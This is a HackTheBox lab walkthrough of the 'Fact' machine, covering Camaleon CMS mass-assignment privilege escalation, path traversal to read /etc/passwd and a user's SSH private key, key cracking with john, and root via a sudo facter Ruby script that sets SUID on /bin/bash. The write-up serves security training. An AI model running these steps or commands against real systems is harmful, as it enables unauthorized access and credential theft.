---
title: "HackTheBox: Walkthrough of Fact machine"
date: 2026-02-02 17:24:00 +0000
categories: [ctf,hackthebox,season10]
tags: [ctf,walkthrough,red team, writeup, hackthebox, htb, cameleo CMS]
published: false
---
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png" alt="Challenge logo" width="100" />

# Table Of Content
- [Table Of Content](#table-of-content)
- [Challenge info](#challenge-info)
  - [Prerequisite tools](#prerequisite-tools)
- [Scanning and enumeration](#scanning-and-enumeration)
  - [Nmap scan](#nmap-scan)
    - [Additional Information from the scan](#additional-information-from-the-scan)
  - [Enumeration](#enumeration)
    - [HTTP Enumeration](#http-enumeration)
      - [Fuzzing with ffuf](#fuzzing-with-ffuf)
      - [Researching for known vulnerabilities](#researching-for-known-vulnerabilities)
- [Exploitation](#exploitation)
  - [Privilege escalation in web](#privilege-escalation-in-web)
  - [Further research for exploits](#further-research-for-exploits)
  - [SSH login - Initial Access](#ssh-login---initial-access)
- [Privilege Escalation](#privilege-escalation)

# Challenge info
- **Name:** *Fact*
- **Platform:** *Linux*
- **Difficulty Level**: <span style="color: #32a852;">*Easy*</span>
- **Category:** *Web*

## Prerequisite tools
- nmap
- ffuf
- burpsuit
  
# Scanning and enumeration
## Nmap scan
I started with an Nmap scan to discover open ports and services on the target.

```bash
└─$ nmap -vv -sV -sC $ip -oX scan.xml
...reducted...
Scanning facts.htb (10.129.21.223) [2 ports]
Discovered open port 80/tcp on 10.129.21.223
Discovered open port 22/tcp on 10.129.21.223
...reducted...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8C83ADFFE48BE12C38E7DBCC2D0524BC
|_http-title: facts
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...reducted...
```

### Additional Information from the scan
- SSH Host Keys: 
  - ecdsa
  - ed25519 
- HTTP Server Header: nginx/1.26.3 (Ubuntu)
  - OS: Ubuntu Linux
  - Server: nginx

## Enumeration
since only two ports are opened, I decided to enumerate HTTP fiest since SSH might require credentials

### HTTP Enumeration
First things first, I opened the the site in the browser to have a good feel of it. 
![initial site](/assets/images/Pasted%20image%2020260202164228.png)

> The IP resolves to `facts.htb` and so it is a must you add it to the hosts file in the `/etc`{: .filepath } dir as show below.
{: .prompt-tip }
```bash
sudo echo $ip facts.htb >> /etc/hosts
```



#### Fuzzing with ffuf
After going through the page source and inspecting the **dev tools**, I decided to fuzz to get hidden paths.

```bash
└─$ ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
.perf                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 339ms]
.htpasswd               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 566ms]
                        [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 573ms]
.cvsignore              [Status: 200, Size: 11128, Words: 1328, Lines: 125, Duration: 724ms]
.forward                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 766ms]
.history                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 769ms]
.cache                  [Status: 200, Size: 11116, Words: 1328, Lines: 125, Duration: 3235ms]
.bash_history           [Status: 200, Size: 11137, Words: 1328, Lines: 125, Duration: 3249ms]
.listing                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 3239ms]
.bashrc                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 3249ms]
.rhosts                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 3258ms]
.passwd                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 3256ms]
.listings               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 3264ms]
.sh_history             [Status: 200, Size: 11131, Words: 1328, Lines: 125, Duration: 3296ms]
.web                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3296ms]
.svn                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3303ms]
.subversion             [Status: 200, Size: 11131, Words: 1328, Lines: 125, Duration: 3325ms]
.swf                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3330ms]
.mysql_history          [Status: 200, Size: 11140, Words: 1328, Lines: 125, Duration: 3468ms]
.hta                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3468ms]
.htaccess               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 3531ms]
.profile                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 3654ms]
.cvs                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3723ms]
.ssh                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 3784ms]
.config                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 3843ms]
400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 944ms]
404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 899ms]
500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 725ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3959ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3994ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3664ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3872ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5189ms]
cache                   [Status: 200, Size: 11116, Words: 1328, Lines: 125, Duration: 2553ms]
captcha                 [Status: 200, Size: 4653, Words: 16, Lines: 22, Duration: 3645ms]
config                  [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 2357ms]
cvs                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 4208ms]
CVS                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 4129ms]
en                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 2480ms]
error                   [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 4195ms]
forward                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2500ms]
history                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 381ms]
hta                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1536ms]
htpasswd                [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1692ms]
index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2206ms]
index.htm               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2178ms]
Index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2294ms]
index.html              [Status: 200, Size: 11128, Words: 1328, Lines: 125, Duration: 2194ms]
index.php               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2235ms]
listing                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2114ms]
listings                [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2122ms]
page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 3832ms]
passwd                  [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 2636ms]
perf                    [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2866ms]
post                    [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 4281ms]
profile                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2213ms]
robots.txt              [Status: 200, Size: 99, Words: 12, Lines: 2, Duration: 2441ms]
robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 2766ms]
rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 2716ms]
search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 2899ms]
sitemap.gz              [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 3584ms]
sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 3810ms]
sitemap.xml             [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 3566ms]
ssh                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2599ms]
svn                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2424ms]
swf                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2418ms]
up                      [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 2522ms]
web                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2151ms]
```

Lots of interesting paths were discovered including a login page on `http://facts.htb/admin/login`

I tried default credentials bt they were all invalid

![login page](/assets/images/Pasted%20image%2020260202164611.png)

Below the login page is a `Create account link` to create new user accounts
![Registration successful](/assets/images/Pasted%20image%2020260202164744.png)

With the new account I was able to login to the site.

Further enumeration reveals the site is a CMS specificatlly **Cameleon CMS version 2.9.0**

#### Researching for known vulnerabilities
[github advisories - Camaleon CMS Vulnerable to Privilege Escalation through a Mass Assignment](https://github.com/advisories/GHSA-rp28-mvq3-wf8j)

This specific version was vulnerable to privilege escalation through mass assignment. With some background in API pentesting, I knew straight away to set `is_admin` to `true`

# Exploitation
## Privilege escalation in web
Lo and behold I was able to escalate privilege within the web app to admin using burp.
![Mass assignment](/assets/images/Pasted%20image%2020260202170230.png)

## Further research for exploits
[github advisories - Camaleon CMS vulnerable to arbitrary path traversal](https://github.com/advisories/GHSA-cp65-5m9r-vc2c)

Further reseach reveals a path traversal vulnerability accessible via MediaController's download_private_file method allows authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions)

I was able to read the passwd file to know the users with console
- root
- trivia
- william
![reading passwd](/assets/images/Pasted%20image%2020260202172602.png)

From the nmap scan, we had host keys `ecdsa` and `ed25519` which gives me a clue the type of private keys ssh might accept.

However,  for the benefits of the doubt, I still read the authorized keys for trivia.
![public key for trivia](/assets/images/Pasted%20image%2020260202172719.png)

Next, I read the private key for trivia, saved it into a file `trivia_ed25519` and changed permission for the key file.
![Private key for trivia](/assets/images/Pasted%20image%2020260202172841.png)

## SSH login - Initial Access
Logging into ssh Requires a key and so I extracted the hash for the key file using `ssh2john`
![SSh login failed attempt](/assets/images/Pasted%20image%2020260202173111.png)

I was able to crack the hash using `johntheripper`
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
```

After cracking, I was able to login to ssh as trivia

![SSH login successful](/assets/images/Pasted%20image%2020260202173650.png)

# Privilege Escalation
```bash
sudo -l
```
Trivia can run `/usr/bin/facter` as any user without a password thus `(ALL) NOPASSWD: /usr/bin/facter`

From gitfobin I can execute a custom ruby script using the fact command to gain root access.
![exploit research gitgobin](/assets/images/Pasted%20image%2020260202175510.png)

So I created a simple script (`<script-name>.rb`) in the `/tmp` folder  to give `/bin/bash` SUID bits

```ruby
require "fileutils"

dest   = "/bin/bash"
File.chmod(0o4755, dest)
puts "SUID set on #{dest}"
```

finally, run the script to give bash SUID bits the `/bin/bash -p` to become root.
```bash
sudo facter --custom-dir=/tmp x ; /bin/bash -p
```

![running script](/assets/images/Pasted%20image%2020260202175856.png)

![pwned](https://labs.hackthebox.com/achievement/machine/2081001/829)

> If it comes to real life penetration testing, it is not advisable to change the permissions of system files as i did in this writeup. The best approach was to get a reverse shell using the ruby script. Find variety of reverse shells from [revshells.com](https://www.revshells.com/)
{: .prompt-tip }